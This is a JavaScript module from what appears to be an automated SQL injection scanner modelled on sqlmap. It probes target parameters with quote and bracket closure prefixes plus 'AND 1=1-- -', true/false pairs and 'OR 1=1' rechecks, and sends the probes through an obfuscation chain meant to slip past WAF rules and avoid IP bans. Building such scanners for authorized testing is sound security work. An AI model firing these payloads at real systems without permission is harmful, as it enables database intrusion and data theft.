// =====================================================================
// boundary.js — 闭合上下文探测（对标 sqlmap boundary 系统）：候选并发探测 /
// 真假对差分 / OR 型复核 / knownPoint 直通 / 闭合相似判定。
// 自 Detector.js 拆出（纯搬移）：由 Detector.prototype 挂载（this 语义不变）。
// =====================================================================
import { stripEchoedPayload } from '../echoStrip.js';

  /**
   * 闭合上下文探测（对标 sqlmap boundary 系统）：识别注入点是否需要引号/括号闭合前缀。
   * 思路：对每个候选闭合前缀追加「恒真条件 AND 1=1」，若响应 ≈ 基线，说明该前缀使查询语法
   * 恢复正常且结果集不变（正确闭合 → 与基线一致；错误闭合 → 语法错误/空集 → 明显偏离）。
   * 返回命中的闭合前缀（无包裹返回空串）。探测失败回退空串（不阻塞检测）。
   * @param {object} ctx { httpClient, target, point, config }
   * @returns {Promise<string>} 闭合前缀，如 '' / "'" / "')" / "'))" / '"' / '")'
   */
export async function probeBoundary(ctx) {
    const { point } = ctx;
    const orig = point.originalValue || '1';
    // [P0 2026-09-09] knownPoint 直通：闭合形态已由使用者给定（point.boundary），
    // 跳过 13 候选并发探测（13 请求 → 1 基线请求）。基线仍发 1 次：
    // ① 学习页面特征（_baselineTitle 供 matchTitle 使用）；② 保持「探测阶段 ≥1 次目标可达性验证」语义。
    if (point.knownPoint) return this._knownPointBoundary(ctx, orig);
    // 候选闭合前缀按出现频率排序：无包裹 / 单引号 / 单引号+括号 / 双引号 / 双引号+括号 / 反引号 / 双引号双括号
    // payload 子代理建议补全：反引号（MySQL 标识符包裹）与 "))（双引号双括号场景）
    // [P1-FIX 2026-09-08] 末尾追加 LIKE 上下文闭合形态（%' 及其括号变体）：
    // `WHERE col LIKE '%{v}%'` 是搜索框标准写法，注入值需先闭合前导的 %' 才能追加谓词
    // （'…%' 仍落在字符串字面量内 → 语法错/恒假 → 闭合探测全部落空 → boolean 必漏）。
    // 置于末尾：常见场景仍由前 8 个候选短路命中，正常路径请求开销不变。
    // [P1 批次 2026-09-08] 追加反斜杠转义形态 '\'（对标 sqlmap boundary：目标用
    // addslashes/反斜杠转义时，注入尾反斜杠使后续引号被转义——探测语义为闭合破坏，
    // 与 AND 1=1 组合后响应偏离基线即命中）。仍置于末尾，不影响高频路径短路。
    const candidates = ['', "'", "')", "'))", '"', '")', '`', '"))', "%'", "%')", '%"', '%"))', '\\'];

    // [OPS-FIX 2026-09-18] 闭合探测一律 **不重试**：这些探针里有的会让目标直接挂住
    // （实测某 Express 靶场对 Cookie 值做 `decodeURIComponent`，收到 `%'` 这类非法转义序列
    // 就在 async handler 里抛 URIError → Promise 无人 catch → 该连接永不应答）。
    // 默认 retry=3 + timeoutMs=30s 意味着一个候选吃掉 4×30s，13 个并发候选一起挂住时，
    // 单个注入点的闭合探测就能拖过 2 分钟，而且**重复发送同一攻击特征**正是风控/封 IP 的
    // 触发点。挂住的探针重发大概率还是挂（服务端缺陷不是一次性网络抖动），故此处只发一次；
    // 真·网络抖动的兜底本来就在上层（validity.failStreak / dbHealthGuard）。
    const PROBE_OPTS = { retry: 0 };
    try {
      const base = await this._boundaryBaseline(ctx, orig);
      if (base.skipped) return '';
      /**
       * @param {string} body 候选闭合探针的响应体
       * @param {any} status 候选闭合探针的状态码
       * @param {string} payload 本候选实发 payload（用于剔除回显）
       */
      const similar = (body, status, payload) =>
        this._boundarySimilar(base.baseClean, base.baseStatus, stripEchoedPayload(body, payload), status, ctx.config);
      const similarHits = await this._boundaryCandidateProbes(ctx, orig, candidates, similar, PROBE_OPTS);
      // 降级链与原实现同序：基线比对全落空 → 真假对差分；多候选同时相似 → OR 型复核；否则取首个命中
      if (similarHits.length === 0) {
        const pairPrefix = await this._boundaryPairDiff(ctx, orig, candidates, PROBE_OPTS);
        if (pairPrefix !== null) return pairPrefix;
      }
      if (similarHits.length > 1) {
        const recheckPrefix = await this._boundaryOrRecheck(ctx, orig, similar, similarHits, PROBE_OPTS);
        if (recheckPrefix !== null) return recheckPrefix;
      }
      if (similarHits.length > 0) return similarHits[0].value.prefix;
    } catch {
      /* 探测失败回退空前缀 */
    }
    return '';
  }

  /**
   * [P0 2026-09-09] knownPoint 直通分支：闭合形态已由使用者给定（point.boundary）。
   * 基线仍发 1 次（学习 <title> 特征 + 保持 ≥1 次目标可达性验证语义），基线失败不阻塞检测。
   * @param {object} ctx 检测上下文
   * @param {string} orig 参数原值
   * @returns {Promise<string>} 使用者给定的闭合前缀（缺省空串）
   */
export async function _knownPointBoundary(ctx, orig) {
    const { httpClient, target, point } = ctx;
    try {
      const baseRes = await this.send(httpClient, ctx, this.buildRequest(target, point, orig), ctx);
      point._baselineTitle = this._extractTitle(String(baseRes?.data ?? ''));
    } catch {
      /* 基线失败不阻塞检测 */
    }
    return point.boundary || '';
  }

  /**
   * 闭合探测基线：发 1 次原值请求，学习 <title> 特征，并产出「剔除回显后的基线」供相似判定。
   * @param {object} ctx 检测上下文
   * @param {string} orig 参数原值
   * @returns {Promise<{skipped: boolean, baseClean?: string, baseStatus?: any}>}
   *          skipped=true 表示路径点基线 4xx（路径不存在），调用方应以空前缀收场
   */
export async function _boundaryBaseline(ctx, orig) {
    const { httpClient, target, point } = ctx;
    const baseRes = await this.send(httpClient, ctx, this.buildRequest(target, point, orig), ctx);
    const baseBody = String(baseRes?.data ?? '');
    const baseStatus = baseRes?.status ?? null;
    // 首请求自动学习页面特征：提取 <title> 供后续 matchTitle 使用
    point._baselineTitle = this._extractTitle(baseBody);
    // [TODO §C 2026-09-20] 路径点（--test-path）基线 4xx 时**直接跳过闭合探测**。
    // 语义：闭合前缀是「如何跳出 SQL 字符串字面量」的概念，前提是这个路径**真的执行了 SQL**。
    // 路径不存在（404）时后端根本没路由到查询代码，13 个候选拿到的只是同一张 404 页
    // （Express 默认错误页还会回显请求 URL），剔除回显后仍偶有同形判定 → 噪声 boundary
    // 进而**触发整轮指纹/列数探测（每次约 40 请求）**，全部打在一条不存在的路径上。
    // 实测 e2e 记录：`/api/sleep` 开 --test-path 时 path 点拿到 boundary `%"`。
    // 代价与收益：真存在注入的路径不会是 4xx（要么 200 要么 5xx 报错），故此处早退
    // **不影响任何真实检出**，只砍掉噪声源与白烧请求。
    // 取值口径：4xx 排除 401/403——鉴权/封禁是「这条路径存在但本次不带凭据」，
    // 闭合探测仍可能在被放行后有意义；429 是限流，属于「稍后可能通」。
    const isAbsentPath =
      point.kind === 'path' &&
      baseStatus != null &&
      baseStatus >= 400 &&
      baseStatus < 500 &&
      baseStatus !== 401 &&
      baseStatus !== 403 &&
      baseStatus !== 429;
    if (isAbsentPath) {
      point.boundarySkipReason = `path 基线 HTTP ${baseStatus}（路径不存在），跳过闭合探测以免噪声 boundary 触发整轮指纹/列数探测`;
      return { skipped: true };
    }
    // [ECHO-FIX 2026-09-18] 相似判定必须先剔除「被回显的 payload 自身」。
    // 目标把注入值原样打回页面（`sql=…` 调试回显 / 报错页回显请求 URL）时，正确闭合的响应
    // 比基线**恰好长出 payload 那几个字节**——差异全来自回显文本，与结果集无关。
    // 不剔除的后果不是"判不准"而是"一个候选都不命中"：实测 blackbox-lab 真 MySQL 的 LIKE
    // 搜索框（`WHERE name LIKE '%${kw}%'`，需 `%'` 闭合）13 个候选全部判不相似 →
    // boundary 回退 '' → union 门控与列数二分全落在字符串字面量内 →
    // union 技术位恒 0、列数猜到上限 50（echoStrip.js 文件头那个坑的第 ④ 个实例）。
    return { skipped: false, baseClean: stripEchoedPayload(baseBody, orig), baseStatus };
  }

  /**
   * 并行探测全部闭合候选（原串行，独立请求可并发），返回「与基线相似」的命中集合。
   * @param {object} ctx 检测上下文
   * @param {string} orig 参数原值
   * @param {string[]} candidates 闭合候选（按出现频率排序）
   * @param {(body: string, status: any, payload: string) => boolean} similar 相似判定（已剔除回显）
   * @param {object} PROBE_OPTS 探针请求选项（retry: 0，见 probeBoundary 内注释）
   * @returns {Promise<PromiseFulfilledResult<{ prefix: string; body: string; status: any; payload: string }>[]>}
   */
export async function _boundaryCandidateProbes(ctx, orig, candidates, similar, PROBE_OPTS) {
    const { httpClient, target, point } = ctx;
    const results = await Promise.allSettled(
      candidates.map((prefix) => {
        // [P2-FIX 2026-09-09] 探测 payload 过 tamper 链：WAF 场景下 `-- -` 是 4 连非词字符
        // （CRS 942460 必拦），闭合探测全被拦时 str/like 场景拿不到 boundary → 布尔对必漏。
        // 与 BooleanBlindDetector boundary 对同样走 obfuscateValue，保持投放语义一致。
        const payload = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
        return this.send(httpClient, ctx, this.buildRequest(target, point, payload), PROBE_OPTS)
          .then((r) => ({ prefix, body: String(r?.data ?? ''), status: r?.status, payload }));
      })
    );
    // JSDoc 断言：上面的 filter 已保证 fulfilled，但 TS 无法从回调里收窄，
    // 收窄后调用方 `r.value` / `hit.value` 的访问才是类型安全的（运行时语义不变）。
    return /** @type {PromiseFulfilledResult<{ prefix: string; body: string; status: any; payload: string }>[]} */ (
      results.filter(
        (r) => r.status === 'fulfilled' && similar(r.value.body, r.value.status, r.value.payload)
      )
    );
  }

  /**
   * [PAIR-FIX 2026-09-18] 「与基线比对」这条判据在**回显型目标**上会一个候选都不命中：
   * 基线页里也含被注入的值（`sql=…` 调试回显 / 报错页回显 URL），剔除回显时既剔掉 SQL 文本里
   * 的那份、也剔掉**结果行里**的那份（实测 `1 | Mechanical Keyboard` 被剔成 `Mechanical  `），
   * 于是真闭合的响应与基线永远差着几个字符 → 13 个候选全部落空 → boundary='' →
   * union 门控/列数二分整句落进字符串字面量 → 该点的 union+boolean 技术位全灭
   * （实测 blackbox-lab 真 MySQL 的 LIKE 搜索框 `/api/like?q=`，需 `%'` 或 `'` 闭合）。
   * 换一条**不依赖基线**的判据：等长真假对差分。
   *   `AND 1=1` 与 `AND 1=2` 长度相同（回显增量也相同），各自剔除自己的 payload 后：
   *   · 闭合正确 → 真页有结果集、假页无 → 两侧显著不同；
   *   · 闭合错误 → 两侧同样落进字面量内或同样语法报错 → 剔除回显后逐字相同。
   * 强动态页不会因此假命中：噪声让两侧「相似」而不是「不同」，判据方向正好相反。
   * 成本：仅在基线比对一条候选都没命中时才发（正常站点零额外请求）。
   * 分波投放：候选表按出现频率排序，实战绝大多数上下文落在前 6 个（'' / ' / ') / ')) / " / ")）。
   * 一次把 13 个候选全投 = 26 个请求，实测在「本来就能检出」的目标上白烧 +24 请求
   * （e2e/fixtures/recall/10-search-like.json：41 → 65，撞破它自己的请求数上限），
   * 而且在 WAF 目标上这 26 条全是硬拦截特征 —— 多花的是封 IP 的风险。
   * 先投前 6 个（12 请求），拿不到差分再投剩余（LIKE 的 `%'` 在第 9 位，仍会覆盖到）。
   * @param {object} ctx 检测上下文
   * @param {string} orig 参数原值
   * @param {string[]} candidates 闭合候选（按出现频率排序）
   * @param {object} PROBE_OPTS 探针请求选项（retry: 0）
   * @returns {Promise<string|null>} 命中的闭合前缀；无命中返回 null
   */
export async function _boundaryPairDiff(ctx, orig, candidates, PROBE_OPTS) {
    const { httpClient, target, point } = ctx;
    const WAVES = [candidates.slice(0, 6), candidates.slice(6)];
    for (const wave of WAVES) {
      if (!wave.length) continue;
      const pairHits = await Promise.allSettled(
        wave.map(async (prefix) => {
          const tp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
          const fp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=2-- -`);
          const [t, f] = await Promise.all([
            this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS),
            this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS),
          ]);
          const tc = stripEchoedPayload(String(t?.data ?? ''), tp);
          const fc = stripEchoedPayload(String(f?.data ?? ''), fp);
          // 两侧都空（如全程 404）不构成信号
          return { prefix, ok: tc.length > 0 && !this.chunkedSimilar(tc, fc) };
        })
      );
      const bestPair = /** @type {any} */ (pairHits.find((r) => r.status === 'fulfilled' && r.value.ok));
      if (bestPair) return bestPair.value.prefix;
    }
    return null;
  }

  /**
   * [P1-FIX 2026-09-10 实战实测] 空基线下的闭合前缀歧义消解：
   * 参数**原值查不到行**时（实测 UA 头注入 `WHERE username='Mozilla'` 恒 0 行），**所有**候选
   * 闭合前缀都落在同一个空结果页 → 全部「相似于基线」→ 原实现取第一个即空前缀 `''` →
   * 拿不到 `'` → union 探针无闭合（`Mozilla AND 1=1#` 落进字符串字面量）→ 真假同长 →
   * 门控判「无注入」→ union 通道恒 0（实测 ua 场景只出 error/boolean）。
   * 消解判据（OR 型复核，与门控空基线降级同源）：正确闭合时
   *   · `OR 1=1` → 命中全表 → 偏离基线空页
   *   · `OR 1=2` → 回到原空集 → 仍≈基线
   * 错误闭合（如 `")`）则直接语法错误、两者都不像基线。
   * 成本：仅在「多个候选同时相似」时追加（空基线场景才出现），正常站点零额外请求。
   * 复核候选上限：候选表按出现频率排序（常见形态在前），空基线场景下可能 10+ 个候选同时
   * 「相似」，逐个复核会放大成 2N 个请求。取前 4 个（`''` / `'` / `')` / `'))`）足以覆盖
   * 实战绝大多数上下文，同时把探测预算钉死在 8 个请求以内。
   * @param {object} ctx 检测上下文
   * @param {string} orig 参数原值
   * @param {(body: string, status: any, payload: string) => boolean} similar 相似判定（已剔除回显）
   * @param {PromiseFulfilledResult<{ prefix: string }>[]} similarHits 基线比对的相似命中集合
   * @param {object} PROBE_OPTS 探针请求选项（retry: 0）
   * @returns {Promise<string|null>} 复核命中的闭合前缀；无命中返回 null
   */
export async function _boundaryOrRecheck(ctx, orig, similar, similarHits, PROBE_OPTS) {
    const { httpClient, target, point } = ctx;
    const RECHECK_MAX = 4;
    const probes = await Promise.allSettled(
      similarHits.slice(0, RECHECK_MAX).map(async (s) => {
        const p = s.value.prefix;
        const tp = this.obfuscateValue(ctx, `${orig}${p} OR 1=1-- -`);
        const fp = this.obfuscateValue(ctx, `${orig}${p} OR 1=2-- -`);
        const t = await this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS);
        const f = await this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS);
        return {
          prefix: p,
          ok:
            !similar(String(t?.data ?? ''), t?.status, tp) &&
            similar(String(f?.data ?? ''), f?.status, fp),
        };
      })
    );
    const best = /** @type {any} */ (probes.find((r) => r.status === 'fulfilled' && r.value.ok));
    if (best) return best.value.prefix;
    return null;
  }

  // 闭合探测的相似判定：锚点优先 → 状态码一致 + 分块比对（长度容差 + LCP + 分块相似率兜底）。
  // （P1-D4：从单纯 LCP 升级为分块比对 + 锚点，首部动态内容场景不再误判）
export function _boundarySimilar(baseBody, baseStatus, body, status, config) {
    const anchored = this.matchAnchors(body, config);
    if (anchored !== null) {
      if (anchored === false) return false;
      // ★FIX [P0]：anchored===true 时验证基线也命中 matchString。
      // 若基线和注入后都命中，说明 matchString 过于常见（如 '<html'）→
      // 锚点恒命中 → 闭合探测总返回空前缀 → 漏报。回落分块比对精确判断。
      const baseAnchored = this.matchAnchors(baseBody, config);
      if (baseAnchored !== true) return true;
    }
    if (baseStatus != null && status != null && status !== baseStatus) return false;
    return this.chunkedSimilar(baseBody, body);
  }
